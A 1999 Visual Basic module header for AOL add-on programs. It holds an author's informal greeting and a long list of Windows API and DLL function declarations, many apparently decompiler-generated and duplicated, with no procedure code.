Attribute VB_Name = "ASKARS"
'Hey hows it going my name is chris,i got out of programning school and wanted to make a bas.
'So I did and here it is i hope you like it
'I relly hope you don't stell my stuff  :-)
'This bas is for aol -{4.0}-   but some of the stuff is for aol 3.0
'And also maby for aol 2.5 / 5.0 / other because the codes might just go for them to
'I don't relly know i don't relly care so POOP :-}
'i hope every thing works for ya
'If you want to talk to me then E-Mail Me @
'ASKARS1@hotmail.com
'My AIM NAME is          -{    NbHaCkEr     }-
'NO!! im not a hacker the name NbHaCkEr just came to me so i did it

'       AsKaRs.bas v.¹ completed  July 7 1999 @ 7:12:26 PM
'thanks for using my bas i hope you enjoy,hope you don't stell my codes
'C ya
'                       -AsKaRS

Declare Function mciGetErrorString Lib "winmm.dll" Alias "mciGetErrorStringA" (ByVal dwError As Long, ByVal lpstrBuffer As String, ByVal uLength As Long) As Long
Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Declare Function extfn6ED0 Lib "APIGuide.Dll" Alias "agDeviceCapabilities" () As Long
Declare Function extfn6F08 Lib "APIGuide.Dll" Alias "agDeviceMode" () As Integer
Declare Function extfn6F40 Lib "APIGuide.Dll" Alias "agExtDeviceMode" () As Integer
Declare Function extfn6CD8 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn6D10 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn6D48 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn6CA0 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn6D80 Lib "APIGuide.Dll" Alias "agGetAddressForVBString" () As Long
Declare Function extfn6C30 Lib "APIGuide.Dll" Alias "agGetControlHwnd" () As Integer
Declare Function extfn6DB8 Lib "APIGuide.Dll" Alias "agGetControlName" () As String
Declare Function extfn6C68 Lib "APIGuide.Dll" Alias "agGetInstance" () As Integer
Declare Function extfn6FE8 Lib "APIGuide.Dll" Alias "agHugeOffset" () As Long
Declare Function extfn6F78 Lib "APIGuide.Dll" Alias "agInp" () As Integer
Declare Function extfn6FB0 Lib "APIGuide.Dll" Alias "agInpw" () As Integer
Declare Function extfn7020 Lib "APIGuide.Dll" Alias "agVBGetVersion" () As Integer
Declare Function extfn7058 Lib "APIGuide.Dll" Alias "agVBSendControlMsg" () As Long
Declare Function extfn7090 Lib "APIGuide.Dll" Alias "agVBSetControlFlags" () As Long
Declare Function extfn6DF0 Lib "APIGuide.Dll" Alias "agXPixelsToTwips" () As Long
Declare Function extfn6E60 Lib "APIGuide.Dll" Alias "agXTwipsToPixels" () As Integer
Declare Function extfn6E28 Lib "APIGuide.Dll" Alias "agYPixelsToTwips" () As Long
Declare Function extfn6E98 Lib "APIGuide.Dll" Alias "agYTwipsToPixels" () As Integer
Declare Function extfn76E8 Lib "311.dll" Alias "AOLgetlist" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn5F48 Lib "User" Alias "AppendMenu" () As Integer
Declare Function extfn5F80 Lib "User" Alias "AppendMenu" () As Integer
Declare Function extfn6418 Lib "User" Alias "ArrangeIconicWindow" () As Integer
Declare Function extfn6A70 Lib "GDI" Alias "BitBlt" () As Integer
Declare Function extfn5F10 Lib "User" Alias "CreateMenu" () As Integer
Declare Function extfn6AA8 Lib "GDI" Alias "CreateSolidBrush" () As Integer
Declare Function extfn70C8 Lib "APIGuide.Dll" Alias "dwVBSetControlFlags" () As Long
Declare Function extfn66B8 Lib "User" Alias "ENumChildWindow" () As Integer
Declare Function extfn7640 Lib "User" Alias "enumchildwindows" () As Integer
Declare Function extfn5DC0 Lib "User" Alias "ExitWindow" () As Integer
Declare Function extfn76B0 Lib "User" Alias "ExitWindows" () As Integer
Declare Function extfn6B88 Lib "VBWFind.Dll" Alias "FindChild" () As Integer
Declare Function extfn6BF8 Lib "VBWFind.Dll" Alias "findchildbyclass" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn6BC0 Lib "VBWFind.Dll" Alias "Findchildbytitle" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn5D18 Lib "User" Alias "FindWindow" (ByVal p1 As Any, ByVal p2 As Any) As Integer
Declare Function extfn5D50 Lib "User" Alias "FindWindow" () As Integer
Declare Function extfn5D88 Lib "User" Alias "FindWindow" () As Integer
Declare Function extfn6A00 Lib "GDI" Alias "FloodFill" () As Integer
Declare Function extfn6140 Lib "User" Alias "GetActiveWindow" () As Integer
Declare Function extfn6300 Lib "User" Alias "GetClassName" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn5C00 Lib "User" Alias "GetClassWord" () As Integer
Declare Function extfn6258 Lib "User" Alias "GetCurrentTime" () As Long
Declare Function extfn62C8 Lib "User" Alias "GetCursor" () As Integer
Declare Function extfn65D8 Lib "User" Alias "GetDC" () As Integer
Declare Function extfn65A0 Lib "User" Alias "GetDeskTopWindow" () As Integer
Declare Function extfn6990 Lib "GDI" Alias "GetDeviceCaps" () As Integer
Declare Function extfn5C70 Lib "User" Alias "GetFocus" () As Integer
Declare Function extfn67D0 Lib "Kernel" Alias "GetFreeSpace" () As Long
Declare Function extfn5BC8 Lib "User" Alias "GetFreeSystemResources" (ByVal p1%) As Integer
Declare Function extfn6450 Lib "User" Alias "getmenu" (ByVal p1%) As Integer
Declare Function extfn64C0 Lib "User" Alias "GetMenuItemCount" () As Integer
Declare Function extfn6488 Lib "User" Alias "getmenuitemid" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn64F8 Lib "User" Alias "GetMenuState" () As Integer
Declare Function extfn5B90 Lib "User" Alias "GetMenuString" (ByVal p1%, ByVal p2%, ByVal p3$, ByVal p4%, ByVal p5%) As Integer
Declare Function extfn5E68 Lib "User" Alias "GetMessage" () As Integer
Declare Function extfn74B8 Lib "311.dll" Alias "AOLgetlist" () As Integer
Declare Function extfn6370 Lib "User" Alias "GetNextDlgTabItem" () As Integer
Declare Function extfn7678 Lib "User" Alias "GETnextwindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn5DF8 Lib "User" Alias "GetParent" (ByVal p1%) As Integer
Declare Function extfn6958 Lib "Kernel" Alias "GetPrivateProfileInt" () As Integer
Declare Function extfn6878 Lib "Kernel" Alias "GetPrivateProfileString" () As Integer
Declare Function extfn68B0 Lib "Kernel" Alias "GetProfileInt" () As Integer
Declare Function extfn68E8 Lib "Kernel" Alias "GetProfileString" () As Integer
Declare Function extfn6290 Lib "User" Alias "GetScrollPos" () As Integer
Declare Function extfn6530 Lib "User" Alias "getsubmenu" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn61B0 Lib "User" Alias "GetSysModalWindow" () As Integer
Declare Function extfn6808 Lib "Kernel" Alias "getsystemdirectory" () As Integer
Declare Function extfn6338 Lib "User" Alias "GetSystemMenu" () As Integer
Declare Function extfn6568 Lib "User" Alias "GetSystemMetrics" () As Integer
Declare Function extfn63E0 Lib "User" Alias "gettopwindow" () As Integer
Declare Function extfn6798 Lib "Kernel" Alias "GetVersion" () As Long
Declare Function extfn5CE0 Lib "User" Alias "GetWindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn6648 Lib "User" Alias "GetWindowDC" () As Integer
Declare Function extfn6728 Lib "Kernel" Alias "getwindowdirectory" (ByVal p1$, ByVal p2%) As Integer
Declare Function extfn6098 Lib "User" Alias "GetWindowText" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn63A8 Lib "User" Alias "GetWindowtextlength" (ByVal p1%) As Integer
Declare Function extfn60D0 Lib "User" Alias "GetWindowWord" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn6760 Lib "Kernel" Alias "GetWinFlags" () As Long
Declare Function extfn5FB8 Lib "User" Alias "InsertMenu" () As Integer
Declare Function extfn6220 Lib "User" Alias "iswindowvisible" () As Integer
Declare Function extfn7608 Lib "Kernel" Alias "lstrlen" () As Integer
Declare Function extfn66F0 Lib "Kernel" Alias "lStrln" () As Integer
Declare Function extfn6B50 Lib "MMSystem" Alias "MciSendString" () As Long
Declare Function extfn73A0 Lib "VBMsg.Vbx" Alias "ptConvertUShort" () As Long
Declare Function extfn7448 Lib "VBMsg.Vbx" Alias "ptGetControlModel" () As Long
Declare Function extfn7480 Lib "VBMsg.Vbx" Alias "ptGetControlName" () As String
Declare Function extfn71E0 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn7218 Lib "VBMsg.Vbx" Alias "ptGetIntegerFromAddress" () As Integer
Declare Function extfn71A8 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn7250 Lib "VBMsg.Vbx" Alias "ptGetLongFromAddress" () As Long
Declare Function extfn7170 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn7288 Lib "VBMsg.Vbx" Alias "ptGetStringFromAddress" () As String
Declare Function extfn7138 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn7100 Lib "VBMsg.Vbx" Alias "ptGetVariableAddress" () As Long
Declare Function extfn7330 Lib "VBMsg.Vbx" Alias "ptHiWord" () As Integer
Declare Function extfn72F8 Lib "VBMsg.Vbx" Alias "ptLoWord" () As Integer
Declare Function extfn72C0 Lib "VBMsg.Vbx" Alias "ptMakelParam" () As Long
Declare Function extfn7368 Lib "VBMsg.Vbx" Alias "ptMakeUShort" () As Integer
Declare Function extfn73D8 Lib "VBMsg.Vbx" Alias "ptMessagetoText" () As String
Declare Function extfn7410 Lib "VBMsg.Vbx" Alias "ptRecreateControlHwnd" () As Long
Declare Function extfn6610 Lib "User" Alias "ReleaseDC" () As Integer
Declare Function extfn6AE0 Lib "GDI" Alias "SelectObject" () As Integer
Declare Function extfn5EA0 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, p4 As Any) As Long
Declare Function extfn5ED8 Lib "User" Alias "SendMessage" (ByVal p1%, ByVal p2%, ByVal p3%, ByVal p4$) As Long
Declare Function extfn7560 Lib "User" Alias "SendMessage" () As Long
Declare Function extfn6178 Lib "User" Alias "SetActiveWindow" (ByVal p1%) As Integer
Declare Function extfn5C38 Lib "User" Alias "SetClassWord" () As Integer
Declare Function extfn7598 Lib "User" Alias "SetCursor" () As Integer
Declare Function extfn5CA8 Lib "User" Alias "SetFocus" (ByVal p1%) As Integer
Declare Function extfn5E30 Lib "User" Alias "SetParent" () As Integer
Declare Function extfn61E8 Lib "User" Alias "SetSysModalWindow" () As Integer
Declare Function extfn6A38 Lib "GDI" Alias "SetTextColor" () As Long
Declare Function extfn6108 Lib "User" Alias "SetWindowText" () As Integer
Declare Function extfn75D0 Lib "User" Alias "showwindow" () As Integer
Declare Function extfn6B18 Lib "MMSystem" Alias "sndplaysound" (ByVal p1$, ByVal p2%) As Integer
Declare Function extfn6680 Lib "User" Alias "SwapMouseButton" () As Integer
Declare Function extfn69C8 Lib "GDI" Alias "TextOut" () As Integer
Declare Function extfn74F0 Lib "VBRun300.Dll" Alias "VarPtr" () As Long
Declare Function extfn7528 Lib "VBStr.Dll" Alias "vbeNumChildWindow" () As Integer
Declare Function extfn5FF0 Lib "User" Alias "WinHelp" () As Integer
Declare Function extfn6060 Lib "User" Alias "WinHelp" () As Integer
Declare Function extfn6028 Lib "User" Alias "WinHelp" () As Integer
Declare Function extfn6840 Lib "Kernel" Alias "WritePrivateProfileString" (ByVal p1$, ByVal p2$, ByVal p3$, ByVal p4$) As Integer
Declare Function extfn6920 Lib "Kernel" Alias "WriteProfileString" () As Integer
Declare Sub extsub7918 Lib "APIGuide.Dll" Alias "agCopyData" ()
Declare Sub extsub7950 Lib "APIGuide.Dll" Alias "agCopyData" ()
Declare Sub extsub7988 Lib "APIGuide.Dll" Alias "agDWordTo2Integers" ()
Declare Sub extsub79C0 Lib "APIGuide.Dll" Alias "agOutp" ()
Declare Sub extsub79F8 Lib "APIGuide.Dll" Alias "agOutpw" ()
Declare Sub extsub78E0 Lib "GDI" Alias "DeleteObject" ()
Declare Sub extsub77C8 Lib "User" Alias "DrawMenuBar" ()
Declare Sub extsub7800 Lib "User" Alias "GetScrollRange" (ByVal p1%, ByVal p2%, p3%, p4%)
Declare Sub extsub7790 Lib "User" Alias "GetWindowRect" ()
Declare Sub extsub7A68 Lib "VBMsg.Vbx" Alias "ptCopyTypeToAddress" ()
Declare Sub extsub7A30 Lib "VBMsg.Vbx" Alias "ptGetTypeFromAddress" ()
Declare Sub extsub7AA0 Lib "VBMsg.Vbx" Alias "ptSetControlModel" ()
Declare Sub extsub78A8 Lib "GDI" Alias "Rectangle" ()
Declare Sub extsub7870 Lib "GDI" Alias "SetBKColor" ()
Declare Sub extsub7838 Lib "User" Alias "SetCursorPos" ()
Declare Sub extsub7758 Lib "User" Alias "ShowOwnedPopups" ()
Declare Sub extsub7720 Lib "User" Alias "UpdateWindow" ()
Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Declare Function ChangeMenu Lib "user32" Alias "ChangeMenuA" (ByVal hMenu As Long, ByVal cmd As Long, ByVal lpszNewItem As String, ByVal cmdInsert As Long, ByVal Flags As Long) As Long
Declare Function EnumChildWindows Lib "user32" (ByVal hWndParent As Long, ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
Declare Function EnumDesktopWindows Lib "user32" (ByVal hDesktop As Long, ByVal lpfn As Long, ByVal lParam As Long) As Long
Declare Function FlashWindow Lib "user32" (ByVal hwnd As Long, ByVal bInvert As Long) As Long
Declare Function GetClassLong Lib "user32" Alias "GetClassLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Declare Function GetCursor Lib "user32" () As Long
Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Declare Function GetMenu Lib "user32" (ByVal hwnd As Long) As Long
Declare Function GetMenuString Lib "user32" Alias "GetMenuStringA" (ByVal hMenu As Long, ByVal wIDItem As Long, ByVal lpString As String, ByVal nMaxCount As Long, ByVal wFlag As Long) As Long
Declare Function GetSubMenu Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Declare Function ReleaseCapture Lib "user32" () As Long
Declare Function SetFocus Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Declare Function ReleaseDC Lib "user32" (ByVal hwnd As Long, ByVal hDC As Long) As Long
Declare Function SetBkColor Lib "gdi32" (ByVal hDC As Long, ByVal crColor As Long) As Long
Declare Function Rectangle Lib "gdi32" (ByVal hDC As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function CreateSolidBrush Lib "gdi32" (ByVal crColor As Long) As Long
Declare Function SelectObject Lib "user32" (ByVal hDC As Long, ByVal hObject As Long) As Long
Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (destination As Any, Source As Any, ByVal Length As Long)
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Public Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
Public Declare Function GetMenuItemCount Lib "user32" (ByVal hMenu As Long) As Long
Public Declare Function GetMenuItemID Lib "user32" (ByVal hMenu As Long, ByVal nPos As Long) As Long
Public Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Public Declare Function IsWindowVisible Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function ReadProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Long, ByVal lpBuffer As String, ByVal nSize As Long, ByRef lpNumberOfBytesWritten As Long) As Long
Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function SendMessageLong& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function SendMEssageByString Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As String) As Long
Public Declare Function sendmessagebynum& Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long)
Public Declare Function SetCursorPos Lib "user32" (ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Public Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Public Declare Function showwindow Lib "user32" Alias "ShowWindow" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long
Public Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Public Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SenditByString& Lib "user32" Alias "SendMessageA" (ByVal hwnd&, ByVal wMsg&, ByVal wParam&, ByVal lParam$)
Declare Function EnableWindow Lib "user32" (ByVal hwnd As Long, ByVal cmd As Long) As Long
Declare Function iswindowenabled Lib "user32" Alias "IsWindowEnabled" (ByVal hwnd As Long) As Long
Private Declare Sub RtlMoveMemory Lib "kernel32" (ByRef dest As Any, ByRef Source As Any, ByVal nBytes As Long)
Declare Function RedrawWindow Lib "user32" (ByVal hwnd As Long, lprcUpdate As RECT, ByVal hrgnUpdate As Long, ByVal fuRedraw As Long) As Long
Declare Function MoveWindow Lib "user32" (ByVal hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long
Declare Function SetRect Lib "user32" (lpRect As RECT, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Declare Function dwGetStringFromLPSTR Lib "dwspy32.dll" (ByVal lpcopy As Long) As String
Declare Sub dwCopyDataBynum Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source&, ByVal dest&, ByVal nCount&)
Declare Function dwGetAddressForObject& Lib "dwspy32.dll" (Object As Any)
Declare Sub dwCopyDataByString Lib "dwspy32.dll" Alias "dwCopyData" (ByVal Source As String, ByVal dest As Long, ByVal nCount&)
Declare Function dwXCopyDataBynumFrom& Lib "dwspy32.dll" Alias "dwXCopyDataFrom" (ByVal mybuf As Long, ByVal foreignbuf As Long, ByVal size As Integer, ByVal foreignPID As Long)
Declare Function dwGetWndInstance& Lib "dwspy32.dll" (ByVal hwnd&)
Declare Function RegisterWindowMessage& Lib "user32" Alias "RegisterWindowMessageA" (ByVal lpString As String)
Declare Function EnumWindows& Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long)
Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Declare Function DrawMenuBar Lib "user32" (ByVal hwnd As Long) As Long
Declare Function ShellAbout Lib "shell32.dll" Alias "ShellAboutA" (ByVal hwnd As Long, ByVal szApp As String, ByVal szOtherStuff As String, ByVal hIcon As Long) As Long
Declare Function getparent Lib "user32" Alias "GetParent" (ByVal hwnd As Long) As Long
Declare Function CreatePopupMenu Lib "user32" () As Long
Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function GetTopWindow Lib "user32" (ByVal hwnd As Long) As Long
Declare Function SetFocusAPI Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Declare Function InsertMenu Lib "user32" Alias "InsertMenuA" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function AppendMenu Lib "user32" Alias "AppendMenuA" (ByVal hMenu As Long, ByVal wFlags As Long, ByVal wIDNewItem As Long, ByVal lpNewItem As String) As Long
Declare Function RemoveMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DeleteMenu Lib "user32" (ByVal hMenu As Long, ByVal nPosition As Long, ByVal wFlags As Long) As Long
Declare Function DestroyMenu Lib "user32" (ByVal hMenu%) As Integer
Public Declare Function WSAGetLastError Lib "WSOCK32.DLL" () As Long
Public Declare Function WSAStartup Lib "WSOCK32.DLL" (ByVal wVersionRequired As Long, lpWSADATA As WSADATA) As Long
Public Declare Function WSACleanup Lib "WSOCK32.DLL" () As Long
Public Declare Function gethostname Lib "WSOCK32.DLL" (ByVal szHost As String, ByVal dwHostLen As Long) As Long
Public Declare Function gethostbyname Lib "WSOCK32.DLL" (ByVal szHost As String) As Long
Declare Function SenditbyNum& Lib "user32" Alias "SendMessageA" (ByVal hwnd&, ByVal wMsg&, ByVal wParam&, ByVal lParam&)
Declare Function extfn9328 Lib "User" Alias "GetScrollPos" () As Integer
Declare Function extfn9018 Lib "User" Alias "GetWindowWord" () As Integer
Declare Function extfn8B48 Lib "User" Alias "GetFreeSystemResources" () As Integer
Declare Function extfn9DA8 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn9D70 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn8B80 Lib "User" Alias "SetClassWord" () As Integer
Declare Function extfnA0B8 Lib "APIGuide.Dll" Alias "agDeviceCapabilities" () As Long
Declare Function extfnA0F0 Lib "APIGuide.Dll" Alias "agDeviceMode" () As Integer
Declare Function extfnA128 Lib "APIGuide.Dll" Alias "agExtDeviceMode" () As Integer
Declare Function extfn9E88 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn9EF8 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn9F30 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn9E50 Lib "APIGuide.Dll" Alias "agGetAddressForObject" () As Long
Declare Function extfn9F68 Lib "APIGuide.Dll" Alias "agGetAddressForVBString" () As Long
Declare Function extfn9DE0 Lib "APIGuide.Dll" Alias "agGetControlHwnd" () As Integer
Declare Function extfn9FA0 Lib "APIGuide.Dll" Alias "agGetControlName" () As String
Declare Function extfn9E18 Lib "APIGuide.Dll" Alias "agGetInstance" () As Integer
Declare Function extfn8AD8 Lib "APIGuide.Dll" Alias "agGetStringFromLPSTR" () As String
Declare Function extfnA1D0 Lib "APIGuide.Dll" Alias "agHugeOffset" () As Long
Declare Function extfnA160 Lib "APIGuide.Dll" Alias "agInp" () As Integer
Declare Function extfnA198 Lib "APIGuide.Dll" Alias "agInpw" () As Integer
Declare Function extfnA208 Lib "APIGuide.Dll" Alias "agVBGetVersion" () As Integer
Declare Function extfnA240 Lib "APIGuide.Dll" Alias "agVBSendControlMsg" () As Long
Declare Function extfnA2B0 Lib "APIGuide.Dll" Alias "agVBSetControlFlags" () As Long
Declare Function extfn9FD8 Lib "APIGuide.Dll" Alias "agXPixelsToTwips" () As Long
Declare Function extfnA048 Lib "APIGuide.Dll" Alias "agXTwipsToPixels" () As Integer
Declare Function extfnA010 Lib "APIGuide.Dll" Alias "agYPixelsToTwips" () As Long
Declare Function extfnA080 Lib "APIGuide.Dll" Alias "agYTwipsToPixels" () As Integer
Declare Function extfnA6D8 Lib "311.dll" Alias "AOLgetlist" () As Integer
Declare Function extfn8FA8 Lib "User" Alias "AppendMenu" () As Integer
Declare Function extfn8FE0 Lib "User" Alias "AppendMenu" () As Integer
Declare Function extfn94B0 Lib "User" Alias "ArrangeIconicWindow" () As Integer
Declare Function extfn9B78 Lib "GDI" Alias "BitBlt" () As Integer
Declare Function extfn8F70 Lib "User" Alias "CreateMenu" () As Integer
Declare Function extfn9BE8 Lib "GDI" Alias "CreateSolidBrush" () As Integer
Declare Function extfnA2E8 Lib "APIGuide.Dll" Alias "dwVBSetControlFlags" () As Long
Declare Function extfn9788 Lib "User" Alias "ENumChildWindow" () As Integer
Declare Function extfnA860 Lib "User" Alias "enumchildwindows" () As Integer
Declare Function extfn8E20 Lib "User" Alias "ExitWindow" () As Integer
Declare Function extfnA898 Lib "User" Alias "ExitWindows" () As Integer
Declare Function extfn9CC8 Lib "VBWFind.Dll" Alias "FindChild" () As Integer
Declare Function extfn9D38 Lib "VBWFind.Dll" Alias "findchildbyclass" () As Integer
Declare Function extfn9D00 Lib "VBWFind.Dll" Alias "Findchildbytitle" (ByVal p1%, ByVal p2$) As Integer
Declare Function extfn8D40 Lib "User" Alias "FindWindow" (ByVal p1$, ByVal p2$) As Integer
Declare Function extfn8D78 Lib "User" Alias "FindWindow" () As Integer
Declare Function extfn8DE8 Lib "User" Alias "FindWindow" () As Integer
Declare Function extfn9B08 Lib "GDI" Alias "FloodFill" () As Integer
Declare Function extfn91D8 Lib "User" Alias "GetActiveWindow" () As Integer
Declare Function extfn9398 Lib "User" Alias "GetClassName" (ByVal p1%, ByVal p2$, ByVal p3%) As Integer
Declare Function extfn8C28 Lib "User" Alias "GetClassWord" () As Integer
Declare Function extfn92F0 Lib "User" Alias "GetCurrentTime" () As Long
Declare Function extfn9360 Lib "User" Alias "GetCursor" () As Integer
Declare Function extfn96A8 Lib "User" Alias "GetDC" () As Integer
Declare Function extfn9670 Lib "User" Alias "GetDeskTopWindow" () As Integer
Declare Function extfn9A98 Lib "GDI" Alias "GetDeviceCaps" () As Integer
Declare Function extfn8C98 Lib "User" Alias "GetFocus" () As Integer
Declare Function extfn98D8 Lib "Kernel" Alias "GetFreeSpace" () As Long
Declare Function extfn8BB8 Lib "User" Alias "GetFreeSystemResources" () As Integer
Declare Function extfn9520 Lib "User" Alias "getmenu" () As Integer
Declare Function extfn9590 Lib "User" Alias "GetMenuItemCount" () As Integer
Declare Function extfn9558 Lib "User" Alias "getmenuitemid" () As Integer
Declare Function extfn95C8 Lib "User" Alias "GetMenuState" () As Integer
Declare Function extfn8B10 Lib "User" Alias "GetMenuString" () As Integer
Declare Function extfn8E90 Lib "User" Alias "GetMessage" () As Integer
Declare Function extfn9408 Lib "User" Alias "GetNextDlgTabItem" () As Integer
Declare Function extfn8A68 Lib "User" Alias "GETnextwindow" () As Integer
Declare Function extfn8E58 Lib "User" Alias "GetParent" () As Integer
Declare Function extfn9A60 Lib "Kernel" Alias "GetPrivateProfileInt" () As Integer
Declare Function extfn9980 Lib "Kernel" Alias "GetPrivateProfileString" () As Integer
Declare Function extfn99B8 Lib "Kernel" Alias "GetProfileInt" () As Integer
Declare Function extfn99F0 Lib "Kernel" Alias "GetProfileString" () As Integer
Declare Function extfn9600 Lib "User" Alias "getsubmenu" () As Integer
Declare Function extfn9248 Lib "User" Alias "GetSysModalWindow" () As Integer
Declare Function extfn9910 Lib "Kernel" Alias "getsystemdirectory" () As Integer
Declare Function extfn93D0 Lib "User" Alias "GetSystemMenu" () As Integer
Declare Function extfn9638 Lib "User" Alias "GetSystemMetrics" () As Integer
Declare Function extfn9478 Lib "User" Alias "gettopwindow" () As Integer
Declare Function extfn9868 Lib "Kernel" Alias "GetVersion" () As Long
Declare Function extfn8D08 Lib "User" Alias "GetWindow" (ByVal p1%, ByVal p2%) As Integer
Declare Function extfn9718 Lib "User" Alias "GetWindowDC" () As Integer
Declare Function extfn97F8 Lib "Kernel" Alias "getwindowdirectory" () As Variant
